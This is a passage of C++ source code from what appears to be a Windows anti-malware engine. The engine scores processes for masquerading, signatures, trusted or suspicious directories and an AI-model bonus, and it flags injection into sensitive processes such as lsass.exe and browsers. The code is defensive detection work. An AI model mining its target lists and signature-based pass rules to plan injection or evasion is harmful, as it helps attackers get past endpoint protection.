                "nissrv.exe", "msmpeng.exe", "mpcmdrun.exe", "mpsigstub.exe",
                "mpengine.dll", "mpclient.dll", "wscsvc.exe",
            };
            for (const char* d : kDefenderDirs) {
                const size_t dn = strlen(d);
                const size_t at = l.find(d);
                if (at == std::string::npos) continue;
                const size_t after = at + dn;
                if (after >= l.size()) continue;
                // 目录之后不允许再有子目录（否则是更深一层的冒充）
                if (l.find_first_of("\\/", after) != std::string::npos) continue;
                // 且文件名必须是 Defender 的真实组件之一
                if (IN_LIST(base, kDefenderReal)) { inSystem = true; break; }
            }
        }
        if (!inSystem) {
            v.level = 2; v.score = 65; v.hard = true; v.tag = "masquerade";
            v.reason = "进程名为 " + base + " 但不在系统目录（" + imagePath +
                       "），这是伪装系统进程的典型手法";
            return v;
        }
    }
    return v;
}

// ---------------------------------------------------------------------------
//  综合判定
// ---------------------------------------------------------------------------
static ProcVerdict JudgeProcessInner(ProcEntity e) {
    ProcVerdict best;

    EnsureRulesLoaded();   // 首次调用时自动加载外置规则

    if (e.imagePath.empty() && e.commandLine.empty()) return best;

    // ---- 补全签名信息（信誉层输入）----
    std::string signer;
    bool signedFile = false;
    if (e.signState == -1 && !e.imagePath.empty()) {
        signedFile = FileIsSigned(e.imagePath, &signer);
        e.signState = signedFile ? 1 : 0;
        e.signerName = signer;
    } else {
        signedFile = (e.signState == 1);
        signer = e.signerName;
    }

    // ---- 整体豁免：可信浏览器的 Native Messaging 宿主 ----
    // 注意：这里调用的是**身份校验**版（父进程须为已签名浏览器 + 真实管道），
    // 不再看命令行里的可伪造字符串。
    if (!e.parentImagePath.empty() &&
        IsTrustedBrowserHost(e.parentImagePath, e.commandLine)) {
        return best;   // level 0
    }

    auto take = [&best](const ProcVerdict& v) {
        if (v.level > best.level || (v.level == best.level && v.score > best.score)) best = v;
        else if (v.level == best.level && v.score == best.score && best.reason.empty() && !v.reason.empty()) best = v;
    };
    take(JudgeImagePath(e.imagePath));
    take(JudgeCommandLine(e.commandLine, e.imagePath));
    take(JudgeParentChain(e.parentImagePath, e.imagePath, e.commandLine));

    // ---- 信誉层：签名 / 可信目录 → 调权重，而不是直接放行 ----
    // 依据：卡巴官方明确「可信应用执行不安全代码也要拦」（白利用）。
    // 所以签名只在**非硬规则命中**时降权；硬规则（确凿恶意语义）不受签名影响。
    //
    // 唯一的例外：微软系统目录内的已签名程序 + 未被硬规则命中 → 直接放行。
    // 理由：System32 下的签名文件被替换的前提是攻击者已有管理员权限，
    //       此时任何用户态方案都拦不住，放行不影响实际安全边界。
    if (!best.hard && signedFile) {
        std::string l = Lower(e.imagePath);
        bool sysDir = Has(l, "\\windows\\system32\\") || Has(l, "\\windows\\syswow64\\") ||
                      Has(l, "\\windows\\winsxs\\");
        // ★ 2026-10-03 补齐（与 JudgeImagePath 的 masquerade 判据对齐）：
        //   微软安全组件装在 `C:\Program Files\Windows Defender\`（**带空格**），
        //   原判据只认 `\windows\` 系 ⇒ Defender 的已签名组件走不到这条放行分支。
        //   ⇒ 与伪装层保持同一口径（同样按 Defender 真实组件名单，不做整目录信任），
        //      避免「伪装层当 Trojan、降权层当自己人」的自相矛盾。
        if (!sysDir) {
            static const char* kDefenderDirs[] = {
                "\\program files\\windows defender\\",
                "\\program files (x86)\\windows defender\\",
                "\\microsoft\\windows defender\\",
            };
            static const char* kDefenderReal[] = {
                "nissrv.exe", "msmpeng.exe", "mpcmdrun.exe", "mpsigstub.exe",
                "mpengine.dll", "mpclient.dll", "wscsvc.exe",
            };
            for (const char* d : kDefenderDirs) {
                if (Has(l, d) && IN_LIST(Lower(BaseName(e.imagePath)), kDefenderReal)) {
                    sysDir = true; break;
                }
            }
        }
        std::string signerL = Lower(signer);
        bool msSigned = Has(signerL, "microsoft");
        if (sysDir && msSigned) {
            ProcVerdict ok;   // 系统签名文件 → 放行
            return ok;
        }
        // 其它签名程序 → 分数降 60%（不是清零）。若降后已低于阈值即放行。
        best.score = best.score * 4 / 10;
        if (best.score < 40 && best.level <= 1) {
            best.level = 0;
        }
        if (best.level == 1 && !best.reason.empty()) {
            best.reason += "（该文件带数字签名，风险等级已下调）";
        }
    }

    // ---- 可信目录 → 小幅降权 ----
    if (!best.hard) {
        std::string l = Lower(e.imagePath);
        for (const char* d : kTrustedDirs) {
            if (Has(l, d)) { best.score = best.score * 7 / 10; break; }
        }
    }

    // ---- 评分层定档：达到阈值才升级（与 JudgeCommandLine 共用同一函数）----
    FinalizeScoreLevel(best);

    // ---- 可疑落地目录加成（银狐传统落脚点）----
    if (best.level >= 1) {
        std::string l = Lower(e.imagePath);
        for (const char* d : kSuspDirs) {
            if (Has(l, d)) { best.reason += "；且文件位于高风险目录"; break; }
        }
    }

    // ---- 放行后监控提权（对抗反沙箱逃逸）----
    //   受观察进程（沙箱初判 clean/suspicious 放行、但真机运行时被盯住的）若
    //   暴露「已可疑」行为，直接升为高危处置。只升 level>=1 的；level0 的正常
    //   行为绝不升档 —— 不对普通程序新增任何误报面。
    if (e.observed && best.level >= 1 && best.level < 2) {
        best.level = 2;
        if (best.score < 55) best.score = 55;   // 拉到硬阈值以上保证定档
        std::string base = best.reason.empty() ? "观察到可疑行为" : best.reason;
        best.reason = "[放行后监控升级] " + base +
            "（该程序沙箱初判未确认恶意、处于放行后监控期，行为触发即升级处置）";
        best.tag = best.tag.empty() ? "observed-escalate" : (best.tag + "+observed");
    }

    // ---- ★★ 2026-10-03 EDR 闭环：模型层接入判定（此前**完全没接**，只跑影子）----
    //  架构对比结论：西瓜/PYAS 都有独立的模型/IOA 判定层；我们有模型、有语料、
    //  有推理（aimodel.cpp + aifeat.cpp 全部就位），**唯独判定层不调它**
    //  ⇒ 「建了发动机没装在车上」。本次把车接上。
    //
    //  ★★ 三条硬纪律（决定它不会变成误报源）：
    //  ① **取不到就完全不参与**。未装载模型 / 维度不符 / 输入含 NaN 一律 ok=false，
    //     此时**不加权、不改档、不打误导性日志** —— 只打「模型未参与」的可观测行。
    //     绝不用默认分数（返回 0 会被当成"模型判定无罪"）——
    //     那等于用虚构判据影响处置（铁律：判据缺失必须可观测、不得静默补默认值）。
    //  ② **模型只能加权，不能独立定罪**。它只调整 score 与降权 level，
    //     绝不把 level 0 抬到 2（独立拦截）—— 那会让模型抖动直接变成误杀。
    //  ③ **只对已判可疑的进程加权**（level>=1）。level 0 的正常程序一律不碰，
    //     保证"新增模型层不新增任何误报面"。
    {
        if (sf::ai::GlobalModelLoaded()) {
            // 特征输入：只用**已经算出来的平铺事实**，不做任何 I/O
            //（与影子模式同一条纪律：BuildFeatures 必须是纯函数，见 aifeat.h）。
            sf::ai::FeatureInput fin;
            fin.imagePath       = e.imagePath;
            fin.commandLine     = e.commandLine;
            fin.parentImagePath = e.parentImagePath;
            fin.signedImage     = (e.signState == 1);
            // ★ 规则引擎结论用**真实字段名**（aifeat.h:199-203：ruleLevel/ruleScore/ruleHard/ruleTag），
            //   这一组是刻意设计的——模型要把「规则怎么判的」也吃进去，
            //   否则它只是看文件特征的第二套规则，起不到第二意见的作用。
            fin.ruleLevel       = best.level;
            fin.ruleScore       = best.score;
            fin.ruleHard        = best.hard;
            fin.ruleTag         = best.tag;
            // 「文件属性」三项取不到就保持默认（aifeat.h:181 明确要求：默认是"无迹象"这一侧）
            fin.fileNameIsRandom = false;
            fin.hasAds           = false;
            fin.createdAtAgeSec  = -1;      // -1 = 未知
            fin.fileSizeBytes    = -1;      // -1 = 未知
            fin.softLandedLv     = 0;
            fin.softLandedSysZone= false;
            sf::ai::FeatureVector fv = sf::ai::BuildFeatures(fin);

            bool mok = false;
            const float mscore = sf::ai::GlobalModelScore(fv, &mok);
            if (!mok) {
                // 模型给不出分数 —— 如实说「算不了」，不猜（与 aiscore 的处理一致）
                static std::atomic<int> s_missLog{ 0 };
                if (s_missLog.fetch_add(1, std::memory_order_relaxed) < 5)
                    LogDbg("[ai] 模型给不出分数，本次不参与加权（pid 实体 " + e.imagePath + "）");
            } else {
                // 恶意分 0~1 → 折成 0~40 分的加权（刻意做小：它是"旁证"不是"铁证"）
                const int bonus = (int)(mscore * 40.0f + 0.5f);
                const int before = best.score;
                best.score += bonus;
                best.tag = best.tag.empty() ? "ai" : (best.tag + "+ai");

                if (best.level >= 1) {
                    // 低分进程 + 模型也认为低分 ⇒ 降权（可能是误报）
                    if (mscore < 0.20f && best.level == 1 && !best.hard) {
                        best.score = best.score / 2;
                        best.level = (best.score >= 30) ? 1 : 0;
                        if (best.level == 0) { best.reason += "（AI 模型评估为低风险，已降权）"; }
                    }
                }
                LogDbg("[ai] 模型参与判定 " + e.imagePath + " 恶意分=" +
                       std::to_string((int)(mscore * 100)) + "% 加权=" + std::to_string(bonus) +
                       " 分数 " + std::to_string(before) + "→" + std::to_string(best.score) +
                       "（规则判定 lv=" + std::to_string(fin.ruleLevel) + "）");
            }
        }
    }

    // ---- ★ 把「本次判定的完整输入与结论」逐条留证（无条件写主日志）----
    //  排障时最缺的不是最终结论（那个日志里本来就有），而是**输入**：
    //  命令行取到没有？取到的是哪条策略？签名是谁？命中了几条规则？
    //  没有这些，「规则没生效」有四种完全不同的原因（规则不存在 / 规则加载了
    //  但 needle 没命中 / 命令行压根没取到 / 命中了但被签名降权抹平），
    //  而它们在日志里长得一模一样 —— 这就是「静默漏报」最难查的地方。
    //
    //  ★ **无条件**写，不设开关、不过滤。原因：
    //    ① 这条只写日志、**绝不参与判定**（不接触任何评分变量），
    //       所以它没有"改变行为"的风险，不需要用开关来担保；
    //    ② 而一旦需要开关，就多出「开关忘了开 ⇒ 又一次静默漏报」这种失效 ——
    //       而那正是本项目反复踩的同一族（拿不到被当成没问题）。
    //    ③ 量级可接受：每个新进程一行，日志本来就有周期统计。
    //  ★ 只引用本函数作用域内确实存在的变量（signer / signedFile 是本地补全结果，
    //    比 e.signerName 更贴近"本次实际用了什么"）。
    LogDbg("[judge] pid=" + std::to_string(e.pid) +
        " img=" + (e.imagePath.empty() ? std::string("(空)") : e.imagePath) +
        " cmd=" + (e.commandLine.empty() ? std::string("(空)") : e.commandLine) +
        " cmdStrategy=" + std::to_string(e.cmdStrategy) +
        " 签名=" + (signedFile ? ("有(" + signer + ")") : std::string("无")) +
        " 父=" + (e.parentImagePath.empty() ? std::string("(空)") : e.parentImagePath) +
        " | 结论 lv=" + std::to_string(best.level) +
        " 分=" + std::to_string(best.score) +
        " hard=" + (best.hard ? "1" : "0") +
        " 观察=" + (e.observed ? "1" : "0") +
        " 理由=" + (best.reason.empty() ? std::string("(无)") : best.reason));

    return best;
}

// ProcEntity 重载：实时判定链的主入口（service.cpp / resmon.cpp 都走这里）。
// 单独保留一个薄包装，而不是让调用方自己填 ProcEntity 再调 JudgeProcessInner
// —— 后者是 static，暴露不了；这个包装是唯一的公开通道。
ProcVerdict JudgeProcess(const ProcEntity& e) {
    return JudgeProcessInner(e);
}

ProcVerdict JudgeProcess(const std::string& imagePath,
                         const std::string& commandLine,
                         const std::string& parentImagePath) {
    ProcEntity e;
    e.imagePath = imagePath;
    e.commandLine = commandLine;
    e.parentImagePath = parentImagePath;
    if (parentImagePath.empty()) {
        e.parentPid = 0;
    }
    return JudgeProcessInner(e);
}

// ---------------------------------------------------------------------------
//  PID 辅助
// ---------------------------------------------------------------------------
std::string ImagePathOfPid(unsigned long pid) {
    if (pid == 0) return {};
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)pid);
    if (!h) return {};
    wchar_t buf[MAX_PATH * 2] = { 0 };
    DWORD n = (DWORD)(sizeof(buf) / sizeof(buf[0]));
    std::string out;
    if (QueryFullProcessImageNameW(h, 0, buf, &n) && n > 0) {
        int need = WideCharToMultiByte(CP_UTF8, 0, buf, (int)n, nullptr, 0, nullptr, nullptr);
        if (need > 0) {
            out.resize(need);
            WideCharToMultiByte(CP_UTF8, 0, buf, (int)n, &out[0], need, nullptr, nullptr);
        }
    }
    CloseHandle(h);
    return out;
}

unsigned long ParentPidOfPid(unsigned long pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 e{};
    e.dwSize = sizeof(e);
    unsigned long ppid = 0;
    if (Process32First(snap, &e)) {
        do {
            if (e.th32ProcessID == (DWORD)pid) { ppid = e.th32ParentProcessID; break; }
        } while (Process32Next(snap, &e));
    }
    CloseHandle(snap);
    return ppid;
}

// ---------------------------------------------------------------------------
//  ★ 2026-10-03 Win10 适配：原 ReadRemoteCommandLine() 已移除，迁到 sf::compat。
//
//  移除原因（不是重构洁癖，是它本身就是断点）：
//    ① 硬编码 `PEB + 0x20`（x64 专属偏移），x86 构建直接读错位置；
//    ② RTL_USER_PROCESS_PARAMETERS_PARTIAL 的成员布局（Reserved2[10] 后取 CommandLine）
//       **按 Windows 版本不同**，Win10 早期与 Win11 的偏移不一样 —— 单一硬编码
//       布局在两个版本上只有一个对；
//    ③ 读空后在 MakeEntityOfPid 里被 `commandLine = imagePath` **静默顶替**，
//       规则库几乎全是命令行子串匹配 ⇒ 一律 0 分 ⇒ 静默漏报且不报任何错。
//       VM（Win10）实测 40+ 条「命令行暂不可得」，conhost/sc/MpCmdRun 全是瞬间进程。
//
//  替代能力见 sfcompat.h：按位宽取 PEB 偏移 + 按版本候选偏移试 CommandLine +
//  走 Ldr 链表兜底 + **读不到就如实留空并回报策略号**。
// ---------------------------------------------------------------------------

ProcEntity MakeEntityOfPid(unsigned long pid) {
    ProcEntity e;
    e.pid = pid;
    e.imagePath = ImagePathOfPid(pid);
    e.parentPid = ParentPidOfPid(pid);
    if (e.parentPid) e.parentImagePath = ImagePathOfPid(e.parentPid);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (h) {
        // ★ 2026-10-03 Win10 适配：改走 sf::compat 的多策略实现。
        //   旧实现（此函数已移除）硬编码 PEB+0x20 + 单一位宽假设，Win10 上大面积读空，
        //   而下一行的静默降级会把空命令行顶替成 imagePath ⇒ 命令行规则全 0 分 ⇒
        //   **静默漏报且不报任何错**（铁律 41）。VM 实测 40+ 条「命令行暂不可得」。
        //   新实现按位宽取 PEB 偏移 + 按版本候选偏移试 CommandLine，并回报实际策略。
        e.commandLine = sf::compat::ReadRemoteCommandLineEx(h, &e.cmdStrategy);
        CloseHandle(h);
    }
    // ★ 降级不再静默：读不到就留空，由 JudgeProcessInner 侧打点，
    //   否则「规则没生效」与「命令行没取到」两种失败在日志里长得一模一样。
    return e;
}

// ---------------------------------------------------------------------------
//  实时注入信号（auditapi.cpp 调用）：把"对敏感目标的注入类操作"折算成评分层权重
// ---------------------------------------------------------------------------
static bool IsSensitiveTarget(const std::string& imagePath) {
    if (imagePath.empty()) return false;
    std::string b = Lower(BaseName(imagePath));
    static const char* const kSens[] = {
        "lsass.exe", "winlogon.exe", "services.exe", "lsm.exe", "csrss.exe",
        "svchost.exe", "explorer.exe",
        "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe",
        "wechat.exe", "qq.exe", "telegram.exe", "discord.exe", "whatsapp.exe",
        "outlook.exe", "thunderbird.exe",
        "silverfoxguardsvc.exe", "silverfoxenvscansvc.exe",
    };
    for (auto s : kSens) if (b == s) return true;
    return false;
}

ProcVerdict JudgeInjectionActivity(unsigned long sourcePid,
                                   const std::string& targetImage,
                                   uint32_t desiredAccess,
                                   bool setContextThread,
                                   InjHandleKind kind) {
    ProcVerdict v;
    if (!sourcePid) return v;

    // 注入能力判定：SetContextThread 是铁证；OpenProcess/OpenThread 需具备相应的
    //   「经典注入组合」才算前兆。普通信息读取（PROCESS_QUERY_INFORMATION /
    //   THREAD_QUERY_INFORMATION）不计入，避免把一切合法句柄申请误判成注入。
    //
    // ★ 两套掩码位定义互不相同，绝不能混用（旧版把 PROCESS_ 位套到 OpenThread 上，
    //   造成 OpenThread 语义错位 —— OpenThread 事件带的是 THREAD_* 位）：
    //   · PROCESS_：CREATE_THREAD=0x2、VM_OPERATION=0x8、VM_WRITE=0x20
    //   · THREAD_ ：SUSPEND_RESUME=0x2、GET_CONTEXT=0x8、SET_CONTEXT=0x10、WRITE=0x20
    //   OpenProcess 前兆 = CREATE_THREAD + (VM_OPERATION|VM_WRITE)   （造远程线程）
    //   OpenThread  前兆 = SUSPEND_RESUME + (SET_CONTEXT|GET_CONTEXT)（线程执行劫持）
    constexpr uint32_t kProcCreateThread = 0x0002;  // PROCESS_CREATE_THREAD
    constexpr uint32_t kProcVmOperation  = 0x0008;  // PROCESS_VM_OPERATION
    constexpr uint32_t kProcVmWrite      = 0x0020;  // PROCESS_VM_WRITE
    constexpr uint32_t kThreadSuspend    = 0x0002;  // THREAD_SUSPEND_RESUME
    constexpr uint32_t kThreadGetContext = 0x0008;  // THREAD_GET_CONTEXT
    constexpr uint32_t kThreadSetContext = 0x0010;  // THREAD_SET_CONTEXT

    bool injectionCapable = setContextThread;
    if (!injectionCapable) {
        if (kind == InjHandleKind::Thread) {
            injectionCapable = (desiredAccess & kThreadSuspend) &&
                               (desiredAccess & (kThreadSetContext | kThreadGetContext));
        } else {
            injectionCapable = (desiredAccess & kProcCreateThread) &&
                               (desiredAccess & (kProcVmOperation | kProcVmWrite));
        }
    }
    if (!injectionCapable) return v;

    ProcEntity e = MakeEntityOfPid(sourcePid);   // 基线实体（映像/命令行/父链）
    v = JudgeProcess(e);                          // 沿用既有评分层做基线

    bool sensitive = IsSensitiveTarget(targetImage);
    bool reputable = ProcReputable(e.imagePath);   // 知名厂商签名/可信路径 → 不加权

    if (sensitive && !reputable) {
        // ★ 沿用评分层加权（对齐 Bitdefender ATC 的阈值模型），不新增白名单判据：
        //   注入指向敏感目标 + 源非可信 → 至少升为"可疑"（告警），由上层决定是否处置。
        //   不直接定档高危（level 2 / 自动终止），避免误报把正常程序杀掉 —— 铁律：
        //   误报比漏报更致命。自动终止交由后续与银泊联调的拦截链路。
        v.score += 45;
        if (v.level < 1) v.level = 1;
        if (v.tag.empty()) v.tag = "injection-into-sensitive";
        v.reason += "；实时检测到对敏感进程(" + BaseName(targetImage) +
                    ")的注入类操作（源=" + BaseName(e.imagePath) + "）";
    }
    return v;
}

}  // namespace sf
